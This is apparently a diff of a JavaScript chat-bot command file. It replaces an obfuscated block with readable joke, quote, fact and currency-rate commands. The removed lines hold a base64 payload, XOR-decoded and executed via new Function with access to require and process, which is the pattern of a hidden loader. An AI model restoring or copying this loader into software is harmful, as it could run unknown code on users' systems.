@@ -1,9 +1,141 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const crypto = require('crypto');
+const U = require('../lib/util');
+const { UserError, bold } = U;
+
+const COINS = {
+  btc: 'bitcoin', eth: 'ethereum', usdt: 'tether', bnb: 'binancecoin', sol: 'solana', xrp: 'ripple', usdc: 'usd-coin',
+  ada: 'cardano', doge: 'dogecoin', trx: 'tron', ton: 'the-open-network', dot: 'polkadot', ltc: 'litecoin', matic: 'matic-network', shib: 'shiba-inu'
+};
+const money = n => (n >= 1 ? n.toLocaleString('en-US', { maximumFractionDigits: 2 }) : String(Number(n.toPrecision(4))));
+
+let rates = null; // { at, data }
+async function getRates() {
+  if (rates && Date.now() - rates.at < 3600e3) return rates.data;
+  const d = await U.getJson('https://open.er-api.com/v6/latest/USD', { timeout: 10000 });
+  if (d?.result !== 'success' || !d.rates) throw new Error('rates unavailable');
+  rates = { at: Date.now(), data: d.rates };
+  return d.rates;
+}
+
+const { sendButtons } = require('../lib/interactive');
+
+module.exports = ({ def }) => {
+  def('joke', { cat: 'tools', usage: 'joke', desc: 'A random joke.' }, async ctx => {
+    const j = await U.getJson('https://official-joke-api.appspot.com/random_joke', { timeout: 9000 });
+    if (!j?.setup) throw new UserError('No joke came back. Try again.');
+    await sendButtons(ctx, { body: `${j.setup}\n\n😂 ${bold(j.punchline)}`, title: 'Joke', buttons: [{ label: '🔁 Another joke', cmd: 'joke' }, { label: '💡 Fun fact', cmd: 'fact' }, { label: '📋 Menu', cmd: 'menu' }] });
+  });
+
+  def(['quote', 'inspire'], { cat: 'tools', usage: 'quote', desc: 'A random inspirational quote.' }, async ctx => {
+    const q = await U.getJson('https://zenquotes.io/api/random', { timeout: 9000 });
+    const x = Array.isArray(q) ? q[0] : null;
+    if (!x?.q) throw new UserError('No quote came back. Try again.');
+    await sendButtons(ctx, { body: `“${x.q}”\n\n— ${bold(x.a || 'Unknown')}`, title: 'Quote', buttons: [{ label: '🔁 Another quote', cmd: 'quote' }, { label: '😂 Joke', cmd: 'joke' }, { label: '📋 Menu', cmd: 'menu' }] });
+  });
+
+  def(['fact', 'funfact'], { cat: 'tools', usage: 'fact', desc: 'A random fun fact.' }, async ctx => {
+    const f = await U.getJson('https://uselessfacts.jsph.pl/api/v2/facts/random?language=en', { timeout: 9000 });
+    if (!f?.text) throw new UserError('No fact came back. Try again.');
